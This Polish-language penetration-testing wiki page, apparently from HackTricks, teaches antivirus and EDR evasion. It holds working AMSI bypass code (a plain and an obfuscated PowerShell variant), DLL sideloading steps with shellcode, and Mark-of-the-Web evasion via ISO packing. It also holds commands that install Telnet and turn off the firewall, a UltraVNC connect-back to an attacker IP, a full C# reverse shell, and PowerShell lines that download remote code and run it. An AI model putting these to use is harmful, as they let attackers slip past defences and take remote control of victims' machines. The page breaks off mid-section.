# Bypass antywirusów (AV)

{{#include ../banners/hacktricks-training.md}}

**Ta strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## **Metodologia unikania AV**

Obecnie, AV używają różnych metod do sprawdzania, czy plik jest złośliwy, czy nie, takich jak detekcja statyczna, analiza dynamiczna oraz, w przypadku bardziej zaawansowanych EDR, analiza behawioralna.

### **Detekcja statyczna**

Detekcja statyczna osiągana jest poprzez oznaczanie znanych złośliwych ciągów lub tablic bajtów w binarnym pliku lub skrypcie, a także przez wydobywanie informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały one przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów na obejście tego rodzaju detekcji:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, nie będzie możliwości wykrycia twojego programu przez AV, ale będziesz potrzebować jakiegoś loadera do odszyfrowania i uruchomienia programu w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka ciągów w swoim pliku binarnym lub skrypcie, aby przejść przez AV, ale może to być czasochłonne w zależności od tego, co próbujesz obfuskować.

- **Niestandardowe narzędzia**

Jeśli opracujesz własne narzędzia, nie będzie znanych złych sygnatur, ale zajmuje to dużo czasu i wysiłku.

> [!NOTE]
> Dobrym sposobem na sprawdzenie detekcji statycznej Windows Defendera jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). W zasadzie dzieli plik na wiele segmentów, a następnie zleca Defenderowi skanowanie każdego z nich indywidualnie, w ten sposób może dokładnie powiedzieć, jakie ciągi lub bajty są oznaczone w twoim pliku binarnym.

Zdecydowanie polecam zapoznać się z tą [playlistą na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) na temat praktycznego unikania AV.

### **Analiza dynamiczna**

Analiza dynamiczna to sytuacja, gdy AV uruchamia twój plik binarny w piaskownicy i obserwuje złośliwą aktywność (np. próba odszyfrowania i odczytania haseł przeglądarki, wykonanie minidumpa na LSASS itp.). Ta część może być nieco trudniejsza do obsługi, ale oto kilka rzeczy, które możesz zrobić, aby unikać piaskownic.

- **Sen przed wykonaniem** W zależności od tego, jak to jest zaimplementowane, może to być świetny sposób na ominięcie analizy dynamicznej AV. AV mają bardzo krótki czas na skanowanie plików, aby nie przerywać pracy użytkownika, więc używanie długich okresów snu może zakłócić analizę plików binarnych. Problem polega na tym, że wiele piaskownic AV może po prostu pominąć sen, w zależności od tego, jak jest to zaimplementowane.
- **Sprawdzanie zasobów maszyny** Zwykle piaskownice mają bardzo mało zasobów do pracy (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz być również bardzo kreatywny w tym zakresie, na przykład sprawdzając temperaturę CPU lub nawet prędkości wentylatorów, nie wszystko będzie zaimplementowane w piaskownicy.
- **Sprawdzanie specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera, aby zobaczyć, czy pasuje do tej, którą określiłeś, jeśli nie, możesz sprawić, że twój program zakończy działanie.

Okazuje się, że nazwa komputera piaskownicy Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim złośliwym oprogramowaniu przed detonacją, jeśli nazwa pasuje do HAL9TH, oznacza to, że jesteś w piaskownicy defendera, więc możesz sprawić, że twój program zakończy działanie.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących unikania piaskownic

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wcześniej wspomniano w tym poście, **publiczne narzędzia** ostatecznie **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? Czy mógłbyś użyć innego projektu, który jest mniej znany i również zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie ta druga. Biorąc mimikatz jako przykład, prawdopodobnie jest to jeden z, jeśli nie najbardziej oznaczonych kawałków złośliwego oprogramowania przez AV i EDR, podczas gdy sam projekt jest super fajny, jest również koszmarem do pracy z nim, aby obejść AV, więc po prostu szukaj alternatyw dla tego, co próbujesz osiągnąć.

> [!NOTE]
> Podczas modyfikowania swoich ładunków w celu unikania wykrycia, upewnij się, że **wyłączasz automatyczne przesyłanie próbek** w defenderze, i proszę, poważnie, **NIE PRZESYŁAJ DO VIRUSTOTAL**, jeśli twoim celem jest osiągnięcie unikania w dłuższej perspektywie. Jeśli chcesz sprawdzić, czy twój ładunek jest wykrywany przez konkretne AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXE vs DLL

Kiedy tylko to możliwe, zawsze **priorytetuj używanie DLL do unikania wykrycia**, z mojego doświadczenia wynika, że pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik, aby uniknąć wykrycia w niektórych przypadkach (jeśli twój ładunek ma jakiś sposób uruchomienia jako DLL, oczywiście).

Jak widać na tym obrazie, ładunek DLL z Havoc ma wskaźnik wykrycia 4/26 w antiscan.me, podczas gdy ładunek EXE ma wskaźnik wykrycia 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie antiscan.me normalnego ładunku EXE z Havoc a normalnym ładunkiem DLL z Havoc</p></figcaption></figure>

Teraz pokażemy kilka trików, które możesz wykorzystać z plikami DLL, aby być znacznie bardziej dyskretnym.

## Sideloading DLL i Proxying

**Sideloading DLL** wykorzystuje kolejność wyszukiwania DLL używaną przez loadera, umieszczając zarówno aplikację ofiary, jak i złośliwe ładunki obok siebie.

Możesz sprawdzić programy podatne na Sideloading DLL, używając [Siofra](https://github.com/Cybereason/siofra) oraz następującego skryptu powershell:
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na hijacking DLL w "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Zalecam **samodzielne zbadanie programów podatnych na DLL Hijackable/Sideloadable**, ta technika jest dość dyskretna, jeśli jest wykonana poprawnie, ale jeśli użyjesz publicznie znanych programów Sideloadable DLL, możesz łatwo zostać złapany.

Samo umieszczenie złośliwego DLL o nazwie, którą program oczekuje załadować, nie załaduje twojego ładunku, ponieważ program oczekuje pewnych specyficznych funkcji w tym DLL. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania, które program wykonuje z proxy (i złośliwego) DLL do oryginalnego DLL, zachowując funkcjonalność programu i umożliwiając obsługę wykonania twojego ładunku.

Będę korzystać z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie wygeneruje 2 pliki: szablon kodu źródłowego DLL oraz oryginalny, przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)), jak i proxy DLL mają wskaźnik wykrycia 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> **Zalecam** obejrzenie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) na temat DLL Sideloading oraz [wideo ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy bardziej szczegółowo.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze to zestaw narzędzi do payloadów do omijania EDR-ów za pomocą wstrzymanych procesów, bezpośrednich wywołań systemowych i alternatywnych metod wykonania`

Możesz użyć Freeze do załadowania i wykonania swojego shellcode w sposób dyskretny.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Unikanie to tylko gra w kotka i myszkę, to co działa dzisiaj, może być wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu, jeśli to możliwe, spróbuj łączyć wiele technik unikania.

## AMSI (Interfejs Skanowania Antywirusowego)

AMSI został stworzony, aby zapobiegać "[złośliwemu oprogramowaniu bezplikowemu](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo, programy antywirusowe mogły skanować tylko **pliki na dysku**, więc jeśli udało ci się jakoś wykonać ładunki **bezpośrednio w pamięci**, program antywirusowy nie mógł nic zrobić, aby temu zapobiec, ponieważ nie miał wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z tymi komponentami systemu Windows.

- Kontrola konta użytkownika, czyli UAC (podniesienie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ocena kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Makra VBA w Office

Pozwala to rozwiązaniom antywirusowym na inspekcję zachowania skryptów poprzez ujawnienie zawartości skryptu w formie, która jest zarówno niezaszyfrowana, jak i nieukryta.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje wyświetlenie następującego alertu w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zauważ, jak dodaje `amsi:` przed ścieżką do pliku wykonywalnego, z którego uruchomiono skrypt, w tym przypadku, powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, ale mimo to zostaliśmy złapani w pamięci z powodu AMSI.

Istnieje kilka sposobów na obejście AMSI:

- **Obfuskacja**

Ponieważ AMSI głównie działa na podstawie wykryć statycznych, modyfikacja skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI ma zdolność do deobfuskacji skryptów, nawet jeśli mają one wiele warstw, więc obfuskacja może być złym rozwiązaniem w zależności od tego, jak jest przeprowadzona. To sprawia, że nie jest to proste do ominięcia. Chociaż czasami wystarczy zmienić kilka nazw zmiennych i będziesz w porządku, więc to zależy od tego, jak bardzo coś zostało oznaczone.

- **Obejście AMSI**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (także cscript.exe, wscript.exe itd.), możliwe jest łatwe manipulowanie nim, nawet działając jako użytkownik bez uprawnień. Z powodu tej luki w implementacji AMSI, badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Wymuszenie błędu**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że żadne skanowanie nie zostanie zainicjowane dla bieżącego procesu. Początkowo ujawnione przez [Matta Graebera](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, aby zapobiec szerszemu użyciu.
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu PowerShell, aby uczynić AMSI bezużytecznym dla bieżącego procesu PowerShell. Ta linia została oczywiście oznaczona przez AMSI, więc konieczne są pewne modyfikacje, aby użyć tej techniki.

Oto zmodyfikowane obejście AMSI, które wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie oznaczone, gdy ten post się pojawi, więc nie powinieneś publikować żadnego kodu, jeśli twoim planem jest pozostanie niezauważonym.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie dostarczonego przez użytkownika wejścia) i nadpisaniu go instrukcjami, aby zwrócić kod E_INVALIDARG, w ten sposób wynik rzeczywistego skanowania zwróci 0, co jest interpretowane jako czysty wynik.

> [!NOTE]
> Proszę przeczytać [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) w celu uzyskania bardziej szczegółowego wyjaśnienia.

Istnieje również wiele innych technik używanych do obejścia AMSI za pomocą PowerShell, sprawdź [**tę stronę**](basic-powershell-for-pentesters/#amsi-bypass) oraz [ten repozytorium](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się więcej na ich temat.

Lub ten skrypt, który za pomocą memory patching będzie patchował każdy nowy Powersh

## Obfuscation

Istnieje kilka narzędzi, które można wykorzystać do **obfuskacji kodu C# w czystym tekście**, generowania **szablonów metaprogramowania** do kompilacji binarnych lub **obfuskacji skompilowanych binarnych**, takich jak:

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka zestawu kompilacji [LLVM](http://www.llvm.org/), który ma na celu zwiększenie bezpieczeństwa oprogramowania poprzez [obfuskację kodu](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zabezpieczanie przed manipulacjami.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak używać języka `C++11/14` do generowania, w czasie kompilacji, obfuskowanego kodu bez użycia jakiegokolwiek zewnętrznego narzędzia i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania C++, co utrudni życie osobie, która chce złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to obfuscator binarny x64, który potrafi obfuskować różne pliki pe, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty silnik kodu metamorfnego dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to framework obfuskacji kodu o wysokiej precyzji dla języków wspieranych przez LLVM, wykorzystujący ROP (programowanie oparte na zwrotach). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w łańcuchy ROP, co zakłóca nasze naturalne postrzeganie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekształcić istniejące EXE/DLL w shellcode, a następnie je załadować.

## SmartScreen & MoTW

Możesz zobaczyć ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm zabezpieczeń mający na celu ochronę użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie na podstawie podejścia opartego na reputacji, co oznacza, że rzadko pobierane aplikacje uruchomią SmartScreen, alertując i uniemożliwiając użytkownikowi końcowemu uruchomienie pliku (chociaż plik nadal można uruchomić, klikając Więcej informacji -> Uruchom mimo to).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony po pobraniu plików z internetu, wraz z adresem URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!NOTE]
> Ważne jest, aby zauważyć, że pliki wykonywalne podpisane **zaufanym** certyfikatem podpisu **nie uruchomią SmartScreen**.

Bardzo skutecznym sposobem na zapobieżenie oznaczeniu twoich payloadów Mark of The Web jest pakowanie ich w jakiś rodzaj kontenera, takiego jak ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowane do **wolumenów non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby uniknąć Mark-of-the-Web.

Przykład użycia:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demonstracja omijania SmartScreen poprzez pakowanie ładunków w plikach ISO za pomocą [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Assembly Reflection

Ładowanie binarnych plików C# w pamięci jest znane od dłuższego czasu i wciąż jest to bardzo dobry sposób na uruchamianie narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ ładunek zostanie załadowany bezpośrednio do pamięci bez dotykania dysku, będziemy musieli martwić się tylko o patchowanie AMSI przez cały proces.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc itp.) już oferuje możliwość wykonywania zestawów C# bezpośrednio w pamięci, ale istnieją różne sposoby, aby to zrobić:

- **Fork\&Run**

Polega to na **tworzeniu nowego procesy ofiarnego**, wstrzyknięciu złośliwego kodu post-exploitation do tego nowego procesu, wykonaniu złośliwego kodu, a po zakończeniu, zabiciu nowego procesu. Ma to zarówno swoje zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** naszym procesem implantacji Beacon. Oznacza to, że jeśli coś w naszej akcji post-exploitation pójdzie źle lub zostanie wykryte, istnieje **dużo większa szansa** na **przetrwanie naszego implantatu.** Wadą jest to, że masz **większą szansę** na bycie złapanym przez **Wykrycia Behawioralne**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób możesz uniknąć tworzenia nowego procesu i skanowania go przez AV, ale wadą jest to, że jeśli coś pójdzie źle z wykonaniem twojego ładunku, istnieje **dużo większa szansa** na **utratę twojego beacona**, ponieważ może on się zawiesić.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Jeśli chcesz przeczytać więcej o ładowaniu zestawów C#, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz również ładować zestawy C# **z PowerShell**, sprawdź [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) oraz [film S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Używanie innych języków programowania

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków, dając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na udostępnionym SMB kontrolowanym przez atakującego**.

Pozwalając na dostęp do binarnych plików interpretera i środowiska na udostępnionym SMB, możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repozytorium wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itp. mamy **więcej elastyczności w omijaniu statycznych sygnatur**. Testowanie losowych, nieobfuskowanych skryptów reverse shell w tych językach okazało się skuteczne.

## Zaawansowane omijanie

Omijanie to bardzo skomplikowany temat, czasami musisz wziąć pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, przeciwko któremu się stawiasz, będzie miało swoje własne mocne i słabe strony.

Zachęcam cię do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby uzyskać wgląd w bardziej zaawansowane techniki omijania.

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To także kolejne świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) na temat omijania w głębi.

{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Stare techniki**

### **Sprawdź, które części Defender uznaje za złośliwe**

Możesz użyć [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), który **usunie części binariów**, aż **dowie się, która część Defender** uznaje za złośliwą i podzieli się tym z tobą.\
Innym narzędziem robiącym **to samo jest** [**avred**](https://github.com/dobin/avred) z otwartą stroną internetową oferującą usługę w [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Serwer Telnet**

Do Windows 10 wszystkie systemy Windows miały **serwer Telnet**, który można było zainstalować (jako administrator) wykonując:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Ustaw, aby **uruchamiało się** przy starcie systemu i **uruchom** to teraz:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Zmień port telnet** (stealth) i wyłącz zaporę:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Pobierz z: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (chcesz pobrać pliki binarne, a nie instalator)

**NA GOSPODARZU**: Uruchom _**winvnc.exe**_ i skonfiguruj serwer:

- Włącz opcję _Disable TrayIcon_
- Ustaw hasło w _VNC Password_
- Ustaw hasło w _View-Only Password_

Następnie przenieś plik binarny _**winvnc.exe**_ oraz **nowo** utworzony plik _**UltraVNC.ini**_ do **ofiary**

#### **Połączenie zwrotne**

**Napastnik** powinien **wykonać wewnątrz** swojego **gospodarza** plik binarny `vncviewer.exe -listen 5900`, aby był **przygotowany** na przechwycenie zwrotnego **połączenia VNC**. Następnie, wewnątrz **ofiary**: Uruchom demon winvnc `winvnc.exe -run` i uruchom `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**OSTRZEŻENIE:** Aby zachować dyskrecję, nie możesz zrobić kilku rzeczy

- Nie uruchamiaj `winvnc`, jeśli już działa, bo wywołasz [popup](https://i.imgur.com/1SROTTl.png). sprawdź, czy działa za pomocą `tasklist | findstr winvnc`
- Nie uruchamiaj `winvnc` bez `UltraVNC.ini` w tym samym katalogu, bo spowoduje to otwarcie [okna konfiguracyjnego](https://i.imgur.com/rfMQWcf.png)
- Nie uruchamiaj `winvnc -h` w celu uzyskania pomocy, bo wywołasz [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pobierz z: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Wewnątrz GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Teraz **uruchom lister** za pomocą `msfconsole -r file.rc` i **wykonaj** **ładunek xml** za pomocą:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Aktualny defender zakończy proces bardzo szybko.**

### Kompilacja naszego własnego reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Pierwszy C# Revershell

Skompiluj to za pomocą:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Użyj go z:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# używając kompilatora
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Automatyczne pobieranie i wykonywanie:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista obfuscatorów C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

